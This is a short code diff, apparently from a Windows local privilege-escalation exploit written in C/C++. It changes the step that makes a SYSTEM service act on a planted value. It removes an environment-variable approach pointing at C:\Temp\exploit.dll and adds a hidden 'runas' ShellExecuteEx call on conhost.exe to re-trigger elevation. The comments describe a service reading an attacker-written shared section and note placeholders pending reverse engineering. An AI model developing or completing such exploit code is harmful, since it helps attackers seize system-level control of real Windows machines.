@@ -61,15 +61,15 @@ int wmain() {
         }
     }
 
-    // 6. THE CLEANUP & EXECUTION
-    // TODO: SetEnvironmentVariableW only propagates to child processes of this
-    // process — it will NOT reach a running SYSTEM service (services inherit
-    // env from SCM, not the caller). Replace with a proper RPC call or named
-    // pipe message to the target service once the offset above is confirmed.
-    SetEnvironmentVariableW(L"SYSTEM_TARGET_DLL", L"C:\\Temp\\exploit.dll");
-
-    // Placeholder trigger — replace with the actual RPC/IPC call to the service.
-    system("net helpmsg 1 > NUL");
+    // 6. THE TRIGGER
+    // Re-fire the elevation event so the service re-enters the code path that
+    // reads the shared section. The service's mapped view already sees our
+    // written value — this just needs to make the service act on it.
+    // Replace with a direct RPC/named-pipe call once the target service's
+    // IPC mechanism is confirmed via reverse engineering.
+    SHELLEXECUTEINFO retrigger = { sizeof(retrigger), SEE_MASK_NOZONECHECKS,
+        NULL, L"runas", L"C:\\Windows\\System32\\conhost.exe", L"", L"", SW_HIDE };
+    ShellExecuteEx(&retrigger);
 
     WaitForSingleObject(hThread, 1000);
     CloseHandle(hThread);
